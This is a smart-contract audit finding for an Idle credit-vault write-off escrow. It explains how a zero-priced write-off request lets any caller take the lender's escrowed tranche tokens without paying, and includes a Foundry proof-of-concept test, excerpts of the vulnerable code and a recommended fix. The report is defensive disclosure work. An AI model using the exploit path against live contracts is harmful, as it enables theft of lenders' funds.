### Title
Zero-priced write-off request allows unprivileged fulfiller to steal escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` accepts `underlyingsRequested == 0` while still taking custody of the lender’s tranche tokens. `fullfillWriteOffRequest` then treats a zero-underlying fulfillment as valid, sends no payment to the lender, and transfers the escrowed tranche tokens to the fulfiller.

### Finding Description
The write-off escrow lets a lender deposit tranche tokens while specifying the amount of underlying required to release them. There is no minimum payment check when the request is created, so `amount > 0` can be paired with `underlyingsRequested == 0` [1](#0-0) .

Fulfillment requires exact tranche-token equality and only enforces `_underlyings >= currentRequest.underlyings`. If the stored request price is zero, `_underlyings == 0` satisfies that check [2](#0-1) . The function then deletes the request, performs a zero-value pull, and transfers the lender’s tranche tokens to the arbitrary fulfiller [3](#0-2) .

This is analogous to the reported query-restriction bypass: a degenerate parameter value bypasses the economic constraint that the escrowed assets must be paid for before being released.

### Impact Explanation
An unprivileged fulfiller can permanently acquire every tranche token escrowed in a zero-priced request without transferring any underlying to the lender. For a request holding `T` tranche tokens, the direct loss is `T`, represented by the tranche tokens’ redemption or secondary-market value.

### Likelihood Explanation
Likelihood is moderate to low. It requires a lender to create a request with a nonzero tranche amount and a zero requested-underlying amount, whether through a UI/input error, an omitted field, or an incorrect interpretation of zero as unset. Once such a request exists, any EOA can atomically fulfill it and take the tokens; the function explicitly permits any wallet to fulfill requests [4](#0-3) .

### Recommendation
Reject `underlyingsRequested == 0` in `createWriteOffRequest`, or explicitly separate token donations from payable write-off requests. If zero-priced requests are intended, require an explicit flag and clearly surface the transfer as a gift rather than routing it through fulfillment logic.

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import "../contracts/interfaces/IERC20Detailed.sol";

contract ZeroPricedWriteOffTheftTest is Test {
    IdleCreditVaultWriteOffEscrow escrow;
    IERC20Detailed tranche;
    IERC20Detailed underlying;

    address lender = address(0xA11CE);
    address attacker = address(0xBAD);

    function setUp() public {
        // Fork an environment containing an initialized escrow deployment.
        // Bind `escrow`, `tranche`, and `underlying` to that deployment.
    }

    function test_attackerTakesEscrowedTranchesForZeroPayment() public {
        uint256 trancheAmount = 100e18;

        deal(address(tranche), lender, trancheAmount);

        vm.startPrank(lender);
        tranche.approve(address(escrow), trancheAmount);
        escrow.createWriteOffRequest(trancheAmount, 0);
        vm.stopPrank();

        assertEq(tranche.balanceOf(address(escrow)), trancheAmount);
        assertEq(tranche.balanceOf(attacker), 0);

        vm.prank(attacker);
        escrow.fullfillWriteOffRequest(lender, trancheAmount, 0);

        assertEq(tranche.balanceOf(attacker), trancheAmount);
        assertEq(tranche.balanceOf(address(escrow)), 0);
        assertEq(underlying.balanceOf(lender), 0);
    }
}

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;

  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }
